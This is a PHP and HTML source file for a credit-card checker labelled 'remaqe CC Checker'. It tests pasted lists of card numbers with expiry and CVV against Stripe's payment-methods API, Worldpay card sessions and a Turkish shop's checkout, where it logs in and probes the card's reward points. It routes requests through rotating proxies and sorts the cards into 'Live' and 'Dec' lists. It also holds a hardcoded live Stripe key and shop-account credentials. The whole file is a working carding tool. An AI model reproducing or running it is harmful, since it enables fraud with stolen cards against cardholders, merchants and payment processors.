<?php
// ============================================================
// CC CHECKER v6.0 — ORİJİNAL ARAYÜZ KORUNDU
// ============================================================
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Europe/Istanbul');

// ============================================================
// FONKSİYONLAR
// ============================================================
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function luhn_check($card) {
    $card = preg_replace('/\D/', '', $card);
    $sum = 0;
    $alt = false;
    for ($i = strlen($card) - 1; $i >= 0; $i--) {
        $n = (int)$card[$i];
        if ($alt) {
            $n *= 2;
            if ($n > 9) $n -= 9;
        }
        $sum += $n;
        $alt = !$alt;
    }
    return $sum % 10 == 0;
}

function rebootproxys() {
    if (file_exists("proxy.txt")) {
        $poxySocks = file("proxy.txt");
        if ($poxySocks) {
            $myproxy = rand(0, sizeof($poxySocks) - 1);
            return trim($poxySocks[$myproxy]);
        }
    }
    return null;
}

function bin_lookup($cc) {
    $cctwo = substr($cc, 0, 6);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Host: lookup.binlist.net',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    ]);
    $fim = curl_exec($ch);
    curl_close($ch);
    
    $banco = GetStr($fim, '"bank":{"name":"', '"');
    $nivel = GetStr($fim, '"brand":"', '"');
    $bin = (strpos($fim, '"type":"credit"') !== false) ? 'Credit' : 'Debit';
    
    return ['bank' => $banco, 'brand' => $nivel, 'type' => $bin];
}

// ============================================================
// MODÜL 1 — STRIPE
// ============================================================
function check_stripe($card) {
    $cc = multiexplode(array("|", ":"), $card);
    if (count($cc) < 4) return ['status' => 'error', 'msg' => 'Geçersiz kart'];
    list($ccn, $mm, $yy, $cvv) = $cc;
    if (!luhn_check($ccn)) return ['status' => 'error', 'msg' => 'Luhn geçersiz'];
    
    $stripe_key = 'pk_live_XctzvztiekWf9dJeEn5E7py8';
    $yy2 = substr($yy, -2);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, rebootproxys());
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'type' => 'card',
        'card[number]' => $ccn,
        'card[cvc]' => $cvv,
        'card[exp_year]' => $yy2,
        'card[exp_month]' => str_pad($mm, 2, '0', STR_PAD_LEFT),
        'key' => $stripe_key,
        '_stripe_version' => '2020-03-02'
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($result, true);
    $bin = bin_lookup($ccn);
    
    if (isset($data['id']) && strpos($data['id'], 'pm_') === 0) {
        return ['status' => 'approved', 'msg' => 'Stripe Live!', 'bin' => $bin];
    } else {
        $err = isset($data['error']['message']) ? $data['error']['message'] : 'Stripe hatası';
        return ['status' => 'declined', 'msg' => $err, 'bin' => $bin];
    }
}

// ============================================================
// MODÜL 2 — WORLDPAY
// ============================================================
function check_worldpay($card) {
    $cc = multiexplode(array("|", ":"), $card);
    if (count($cc) < 4) return ['status' => 'error', 'msg' => 'Geçersiz kart'];
    list($ccn, $mm, $yy, $cvv) = $cc;
    if (!luhn_check($ccn)) return ['status' => 'error', 'msg' => 'Luhn geçersiz'];
    
    $yy2 = (strlen($yy) == 4) ? $yy : '20' . $yy;
    $identity = 'fb309fc7-a737-403f-b00b-199832a3b502';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, rebootproxys());
    curl_setopt($ch, CURLOPT_URL, 'https://access.worldpay.com/sessions/card');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'identity' => $identity,
        'cardNumber' => $ccn,
        'cardExpiryDate' => ['month' => intval($mm), 'year' => intval($yy2)],
        'cvc' => $cvv
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/vnd.worldpay.sessions-v1.hal+json',
        'Accept: application/vnd.worldpay.sessions-v1.hal+json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-wp-sdk: access-checkout-web/2.4.0'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($result, true);
    $bin = bin_lookup($ccn);
    
    if (isset($data['_links']['sessions:session']['href'])) {
        return ['status' => 'approved', 'msg' => 'Worldpay Session!', 'bin' => $bin];
    } else {
        $err = isset($data['error_description']) ? $data['error_description'] : 'Worldpay hatası';
        return ['status' => 'declined', 'msg' => $err, 'bin' => $bin];
    }
}

// ============================================================
// MODÜL 3 — PUAN
// ============================================================
function check_puan($card, $mail = 'hasbolaat@gmail.com', $pass = '24022010') {
    $cc = multiexplode(array("|", ":"), $card);
    if (count($cc) < 4) return ['status' => 'error', 'msg' => 'Geçersiz kart'];
    list($ccn, $mm, $yy, $cvv) = $cc;
    if (!luhn_check($ccn)) return ['status' => 'error', 'msg' => 'Luhn geçersiz'];
    
    $BASE = 'https://www.happy.com.tr';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, rebootproxys());
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    curl_setopt($ch, CURLOPT_URL, $BASE . '/index.php?route=account/login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $html = curl_exec($ch);
    $csrf = GetStr($html, 'name="csrfToken" value="', '"');
    if (!$csrf) return ['status' => 'error', 'msg' => 'CSRF alınamadı'];
    
    curl_setopt($ch, CURLOPT_URL, $BASE . '/index.php?route=account/login');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'email' => $mail,
        'password' => $pass,
        'csrfToken' => $csrf
    ]));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_exec($ch);
    $info = curl_getinfo($ch);
    if ($info['http_code'] != 302) return ['status' => 'error', 'msg' => 'Giriş başarısız'];
    
    curl_setopt($ch, CURLOPT_URL, $BASE . '/index.php?route=checkout/cart/add');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'quantity=1&product_id=137515');
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['X-Requested-With: XMLHttpRequest']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    
    curl_setopt($ch, CURLOPT_URL, $BASE . '/index.php?route=checkout/confirm');
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['X-Requested-With: XMLHttpRequest']);
    $html = curl_exec($ch);
    $csrf2 = GetStr($html, 'csrfToken" value="', '"');
    if (!$csrf2) $csrf2 = GetStr($html, 'name="csrfToken" value="', '"');
    if (!$csrf2) return ['status' => 'error', 'msg' => 'CSRF2 alınamadı'];
    
    $yy2 = substr($yy, -2);
    curl_setopt($ch, CURLOPT_URL, $BASE . '/index.php?route=payment/creditcard/checkPoint');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'banka' => 'garanti',
        'cardtype' => 1,
        'cardname' => 'bonus',
        'cc_number' => $ccn,
        'cc_month' => $mm,
        'cc_year' => $yy2,
        'cc_cvv' => $cvv,
        'csrfToken' => $csrf2
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['X-Requested-With: XMLHttpRequest']);
    $result = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($result, true);
    $bin = bin_lookup($ccn);
    
    if (!$data || isset($data['error'])) {
        return ['status' => 'declined', 'msg' => 'Puan yok', 'bin' => $bin];
    }
    $puan = isset($data['amount']) ? floatval($data['amount']) : 0;
    if ($puan > 0) {
        return ['status' => 'approved', 'msg' => 'Puan: ' . $puan, 'bin' => $bin];
    } else {
        return ['status' => 'declined', 'msg' => 'Puan yok', 'bin' => $bin];
    }
}

// ============================================================
// AJAX
// ============================================================
if (isset($_POST['action'])) {
    header('Content-Type: application/json');
    $type = $_POST['type'];
    $card = $_POST['card'];
    $mail = isset($_POST['mail']) ? $_POST['mail'] : 'hasbolaat@gmail.com';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '24022010';
    
    if ($type == 'stripe') {
        $result = check_stripe($card);
    } elseif ($type == 'worldpay') {
        $result = check_worldpay($card);
    } elseif ($type == 'puan') {
        $result = check_puan($card, $mail, $pass);
    } else {
        $result = ['status' => 'error', 'msg' => 'Geçersiz modül'];
    }
    echo json_encode($result);
    exit;
}

// ============================================================
// ORİJİNAL HTML ARAYÜZ (STAT ALANI DÜZENLENDİ)
// ============================================================
?>
<html>
<head>
    <title>remaqe CC Checker</title>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.5.11/css/mdb.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        .module-select { position: absolute; top: 10px; right: 20px; z-index: 10; }
        .module-select select { background: #2a2a2a; color: #fff; border: 1px solid #3a3a3a; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
        .module-select label { color: #888; font-size: 11px; margin-right: 5px; }
        .card-body { position: relative; }
        .badge-info-custom { background: #17a2b8; color: #fff; padding: 3px 8px; border-radius: 12px; font-size: 11px; }
        .stat-item { display: flex; justify-content: space-between; font-size: 13px; padding: 2px 0; }
        .stat-item strong { font-weight: 600; }
        .stat-divider { border-top: 1px solid #333; padding-top: 5px; margin-top: 3px; }
    </style>
</head>
<body>
    <br>
    <div class="row col-md-12">
        &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
        <div class="card col-sm-8">
            <h5 class="card-body h6">CC Checker - remaqe</h5>
            <div class="card-body">
                <center><span>[#REMAQE]</span></center>
                
                <!-- MODÜL SEÇİCİ (SAĞ ÜST) -->
                <div class="module-select">
                    <label>Modül</label>
                    <select id="moduleType">
                        <option value="stripe">Stripe</option>
                        <option value="worldpay">Worldpay</option>
                        <option value="puan">Puan</option>
                    </select>
                </div>
                
                <div class="md-form">
                    <div class="col-md-12">
                        <textarea type="text" style="text-align: center;" id="lista" class="md-textarea form-control" rows="2"></textarea>
                        <label for="lista">Example : 5437711025954502|01|2023|160</label>
                    </div>
                </div>
                <center>
                    <button class="btn btn-primary" style="width: 200px; outline: none;" id="testar" onclick="enviar()">Başlat</button>
                    <button class="btn btn-danger" style="width: 200px; outline: none;" onclick="clearResults()">Durdur</button>
                </center>
            </div>
        </div>
        &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
        
        <!-- STAT ALANI (DÜZENLENDİ) -->
        <div class="card col-sm-2">
            <h5 class="card-body h6">Bilgiler:</h5>
            <div class="card-body">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="font-size:12px;">Status:</span>
                    <span class="badge badge-secondary" id="statusBadge" style="font-size:11px;">Bekleniyor</span>
                </div>
                <div style="background:#1a1a1a; border-radius:6px; padding:8px 10px;">
                    <div class="stat-item">
                        <span>Live:</span>
                        <span><strong class="text-success" id="cLive">0</strong></span>
                    </div>
                    <div class="stat-item">
                        <span>Dec:</span>
                        <span><strong class="text-danger" id="cDie">0</strong></span>
                    </div>
                    <div class="stat-item">
                        <span>Test Edilen:</span>
                        <span><strong class="text-info" id="total">0</strong></span>
                    </div>
                    <div class="stat-item stat-divider">
                        <span>Yüklenen:</span>
                        <span><strong class="text-secondary" id="carregadas">0</strong></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <br>

    <!-- LIVE BÖLÜMÜ -->
    <div class="col-md-12">
        <div class="card">
            <div style="position: absolute; top: 0; right: 0;">
                <button id="mostra" class="btn btn-primary">SHOW/HIDE</button>
            </div>
            <div class="card-body">
                <h6 style="font-weight: bold;" class="card-title">Live - <span id="cLive2" class="badge badge-success">0</span></h6>
                <div id="bode">
                    <div id="liveResults"></div>
                </div>
            </div>
        </div>
    </div>

    <br><br><br>
    <!-- DEC BÖLÜMÜ -->
    <div class="col-md-12">
        <div class="card">
            <div style="position: absolute; top: 0; right: 0;">
                <button id="mostra2" class="btn btn-primary">SHOW/HIDE</button>
            </div>
            <div class="card-body">
                <h6 style="font-weight: bold;" class="card-title">Dec - <span id="cDie2" class="badge badge-danger">0</span></h6>
                <div id="bode2">
                    <div id="decResults"></div>
                </div>
            </div>
        </div>
    </div>

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.js" type="text/javascript"></script>
    <script type="text/javascript">
    $(document).ready(function(){
        $("#bode").hide();
        $("#esconde").show();
        $('#mostra').click(function(){
            $("#bode").slideToggle();
        });
        $("#bode2").hide();
        $("#esconde2").show();
        $('#mostra2').click(function(){
            $("#bode2").slideToggle();
        });
    });

    var approvedCount = 0;
    var declinedCount = 0;
    var totalCount = 0;
    var isRunning = false;

    function addLive(card, msg, type, bin) {
        var binInfo = bin ? ' ' + bin.bank + ' (' + bin.brand + ') - ' + bin.type : '';
        var str = '<div class="result-item"><span class="badge badge-live" style="background:#198754;color:#fff;padding:2px 8px;border-radius:10px;font-size:10px;">●</span> <span class="text-light">' + card + '</span> <span class="text-secondary">→ ' + msg + '</span> <span class="badge-info-custom">' + type + binInfo + '</span></div>';
        document.getElementById('liveResults').innerHTML += str;
        var el = document.getElementById('liveResults');
        el.scrollTop = el.scrollHeight;
    }

    function addDec(card, msg, type, bin) {
        var binInfo = bin ? ' ' + bin.bank + ' (' + bin.brand + ') - ' + bin.type : '';
        var str = '<div class="result-item"><span class="badge badge-dec" style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:10px;font-size:10px;">●</span> <span class="text-light">' + card + '</span> <span class="text-secondary">→ ' + msg + '</span> <span class="badge-info-custom">' + type + binInfo + '</span></div>';
        document.getElementById('decResults').innerHTML += str;
        var el = document.getElementById('decResults');
        el.scrollTop = el.scrollHeight;
    }

    function enviar() {
        if (isRunning) return;
        isRunning = true;
        
        var lines = $("#lista").val().split("\n").filter(function(c) { return c.trim() != ''; });
        var total = lines.length;
        var ap = 0;
        var rp = 0;
        var type = $("#moduleType").val();
        var typeNames = { stripe: 'Stripe', worldpay: 'Worldpay', puan: 'Puan' };
        
        $('#carregadas').html(total);
        document.getElementById('statusBadge').textContent = 'İşleniyor...';
        document.getElementById('statusBadge').className = 'badge badge-warning';
        
        lines.forEach(function(value, index) {
            setTimeout(function() {
                $.ajax({
                    url: window.location.href,
                    type: 'POST',
                    data: {
                        action: 'check',
                        type: type,
                        card: value.trim(),
                        mail: 'hasbolaat@gmail.com',
                        pass: '24022010'
                    },
                    success: function(resultado) {
                        var data = typeof resultado === 'string' ? JSON.parse(resultado) : resultado;
                        var card = value.trim();
                        var msg = data.msg || 'Bilinmiyor';
                        var bin = data.bin || null;
                        
                        if (data.status === 'approved') {
                            ap++;
                            addLive(card, msg, typeNames[type], bin);
                        } else {
                            rp++;
                            addDec(card, msg, typeNames[type], bin);
                        }
                        
                        var fila = parseInt(ap) + parseInt(rp);
                        $('#cLive').html(ap);
                        $('#cDie').html(rp);
                        $('#total').html(fila);
                        $('#cLive2').html(ap);
                        $('#cDie2').html(rp);
                        approvedCount = ap;
                        declinedCount = rp;
                        totalCount = fila;
                        
                        if (fila >= total) {
                            isRunning = false;
                            document.getElementById('statusBadge').textContent = 'Tamamlandı';
                            document.getElementById('statusBadge').className = 'badge badge-success';
                            setTimeout(function() {
                                document.getElementById('statusBadge').textContent = 'Bekleniyor';
                                document.getElementById('statusBadge').className = 'badge badge-secondary';
                            }, 3000);
                        }
                    },
                    error: function() {
                        rp++;
                        addDec(value.trim(), 'Bağlantı hatası', typeNames[type], null);
                        var fila = parseInt(ap) + parseInt(rp);
                        $('#cLive').html(ap);
                        $('#cDie').html(rp);
                        $('#total').html(fila);
                        $('#cLive2').html(ap);
                        $('#cDie2').html(rp);
                        if (fila >= total) {
                            isRunning = false;
                            document.getElementById('statusBadge').textContent = 'Tamamlandı';
                            document.getElementById('statusBadge').className = 'badge badge-success';
                        }
                    }
                });
            }, 500 * index);
        });
    }

    function clearResults() {
        document.getElementById('liveResults').innerHTML = '';
        document.getElementById('decResults').innerHTML = '';
        approvedCount = 0;
        declinedCount = 0;
        totalCount = 0;
        $('#cLive').html('0');
        $('#cDie').html('0');
        $('#total').html('0');
        $('#cLive2').html('0');
        $('#cDie2').html('0');
        $('#carregadas').html('0');
        isRunning = false;
        document.getElementById('statusBadge').textContent = 'Bekleniyor';
        document.getElementById('statusBadge').className = 'badge badge-secondary';
    }

    $('#moduleType').change(function() {
        $('#loginFields').toggle(this.value === 'puan');
    });
    </script>

    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.5.11/js/mdb.min.js"></script>
</body>
<footer></footer>
</html>